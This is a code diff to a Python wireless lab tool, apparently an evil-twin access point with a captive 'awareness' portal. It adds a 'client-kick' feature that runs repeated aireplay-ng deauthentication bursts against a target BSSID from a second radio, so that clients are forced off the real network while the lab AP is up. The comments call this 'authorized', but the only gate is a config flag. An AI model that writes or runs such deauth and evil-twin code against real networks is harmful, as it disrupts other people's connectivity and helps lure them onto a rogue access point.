@@ -26,6 +26,7 @@ from modules.figolab.awareness.portal_server import AwarenessPortal
 from modules.figolab.awareness.client_sessions import SessionStore
 from modules.figolab.wireless_interface import (
     InterfaceSnapshot,
+    prepare_soft_monitor,
     restore_interface,
     rfkill_unblock,
     set_nm_managed,
@@ -34,6 +35,8 @@ from modules.figolab.wireless_interface import (
 )
 from modules.figolab.lab_config import LAB_BINS, LabConfig, channel_band
 from modules.figolab.process_tracker import ProcessTracker
+from modules.constants import DEAUTH_COUNT, DEAUTH_GAP_SEC
+from modules.tools import which_or_none
 
 
 class LabError(RuntimeError):
@@ -65,6 +68,14 @@ class LabSession:
     _portal_restarts: int = 0
     _log_handles: list = field(default_factory=list)
     _lock: threading.RLock = field(default_factory=threading.RLock)
+    # Authorized client-kick (second radio + aireplay deauth against target BSSID).
+    kick_enabled: bool = False
+    kick_monitor: str = ""
+    kick_snapshot: Optional[InterfaceSnapshot] = None
+    kick_bursts: int = 0
+    kick_last_status: str = ""
+    _kick_stop: threading.Event = field(default_factory=threading.Event)
+    _kick_thread: Optional[threading.Thread] = None
 
     def runtime_sec(self) -> int:
         if not self.started_at:
@@ -123,6 +134,116 @@ class LabSession:
         self.metrics.add_event(
             "service", f"Portal auto-restarted (attempt {self._portal_restarts})"
         )
+
+    def kick_ok(self) -> bool:
+        return bool(
+            self.kick_enabled
+            and self._kick_thread is not None
+            and self._kick_thread.is_alive()
+            and not self._kick_stop.is_set()
+        )
+
+    def start_client_kick(self) -> None:
+        """
+        Start periodic authorized deauth bursts against the target BSSID.
+
+        Uses a *second* wireless interface in soft monitor mode so the lab AP
+        on ``config.interface`` stays up. Never uses ``airmon-ng check kill``.
+        """
+        if not self.config.kick_clients:
+            return
+        mon_iface = (self.config.kick_interface or "").strip()
+        bssid = (self.config.target_bssid or "").strip()
+        if not mon_iface:
+            raise LabError("Client-kick is enabled but no monitor interface was selected.")
+        if mon_iface == self.config.interface:
+            raise LabError(
+                "Client-kick needs a *second* wireless adapter.\n"
+                f"AP interface and kick interface cannot both be {mon_iface}."
+            )
+        if not bssid:
+            raise LabError("Client-kick needs the target BSSID (pick a scanned target).")
+        if not which_or_none("aireplay-ng"):
+            raise LabError("aireplay-ng was not found — install aircrack-ng for client-kick.")
+
+        self.kick_snapshot = snapshot_interface(mon_iface)
+        try:
+            prepare_soft_monitor(mon_iface, self.config.channel)
+        except RuntimeError as exc:
+            raise LabError(str(exc)) from exc
+
+        self.kick_monitor = mon_iface
+        self.kick_enabled = True
+        self.kick_bursts = 0
+        self.kick_last_status = "starting"
+        self._kick_stop.clear()
+
+        def _loop() -> None:
+            aireplay = which_or_none("aireplay-ng")
+            if not aireplay:
+                self.kick_last_status = "aireplay-ng missing"
+                return
+            # First burst quickly so clients leave soon after the lab AP is up.
+            first = True
+            while not self._kick_stop.is_set():
+                if not first and self._kick_stop.wait(timeout=float(DEAUTH_GAP_SEC)):
+                    break
+                first = False
+                try:
+                    proc = subprocess.run(
+                        [
+                            aireplay,
+                            "--deauth",
+                            str(DEAUTH_COUNT),
+                            "-a",
+                            bssid,
+                            "-D",
+                            mon_iface,
+                        ],
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
+                    )
+                    self.kick_bursts += 1
+                    if proc.returncode == 0:
+                        self.kick_last_status = f"burst #{self.kick_bursts} ok"
+                        self.metrics.add_event(
+                            "kick", f"Deauth burst #{self.kick_bursts} → {bssid}"
+                        )
+                    else:
+                        tail = ((proc.stderr or "") + (proc.stdout or "")).strip().splitlines()
+                        detail = tail[-1] if tail else f"exit {proc.returncode}"
+                        self.kick_last_status = f"burst #{self.kick_bursts} warn: {detail[:80]}"
+                except subprocess.TimeoutExpired:
+                    self.kick_bursts += 1
+                    self.kick_last_status = f"burst #{self.kick_bursts} timed out"
+                except Exception as exc:  # noqa: BLE001 — keep loop alive
+                    self.kick_last_status = f"error: {exc}"
+                    break
+
+        self._kick_thread = threading.Thread(
+            target=_loop, name="figo-client-kick", daemon=True
+        )
+        self._kick_thread.start()
+        self.metrics.add_event(
+            "kick", f"Client-kick armed on {mon_iface} against {bssid}"
+        )
+
+    def stop_client_kick(self) -> None:
+        self._kick_stop.set()
+        thread = self._kick_thread
+        if thread is not None and thread.is_alive():
+            thread.join(timeout=3.0)
+        self._kick_thread = None
+        self.kick_enabled = False
+        if self.kick_snapshot is not None:
+            try:
+                restore_interface(self.kick_snapshot)
+            except Exception:
+                pass
+            self.kick_snapshot = None
+        self.kick_monitor = ""
+        self.kick_last_status = "stopped"
 
 
 _ACTIVE: Optional[LabSession] = None
@@ -282,6 +403,9 @@ def start_lab_session(config: LabConfig, *, enable_portal: bool) -> LabSession:
                 session.portal.start(bind_host="0.0.0.0")
             session.portal_active = True
 
+        if config.kick_clients:
+            session.start_client_kick()
+
         session.started_at = time.time()
         _set_active(session)
         return session
@@ -352,6 +476,12 @@ def cleanup_lab_session(session: Optional[LabSession] = None) -> None:
                 _set_active(None)
             return
         session._cleaned = True
+
+        # 0. Stop client-kick thread and restore the second radio first.
+        try:
+            session.stop_client_kick()
+        except Exception:
+            pass
 
         # 1. Stop awareness portal
         if session.portal is not None:
@@ -483,6 +613,9 @@ def build_session_report(session: LabSession) -> tuple[dict, str]:
             "gateway": f"{config.gateway_ip}/{config.subnet_prefix}",
             "dhcp_range": f"{config.dhcp_range_start}-{config.dhcp_range_end}",
             "portal_ports": [80, int(config.portal_port)],
+            "client_kick": bool(config.kick_clients),
+            "kick_interface": config.kick_interface if config.kick_clients else "",
+            "kick_bursts": int(session.kick_bursts),
         },
         "metrics": {
             "connected_devices": snap["connected_devices"],
@@ -510,6 +643,12 @@ def build_session_report(session: LabSession) -> tuple[dict, str]:
         f"Channel   : {report['lab']['channel']} ({report['lab']['band']})",
         f"AP secure : {report['lab']['ap_security']}",
         f"Gateway   : {report['lab']['gateway']}",
+        f"Client-kick: {'yes' if report['lab']['client_kick'] else 'no'}"
+        + (
+            f" ({report['lab']['kick_interface']}, bursts {report['lab']['kick_bursts']})"
+            if report["lab"]["client_kick"]
+            else ""
+        ),
         "",
         "RESULTS",
         "-" * 42,
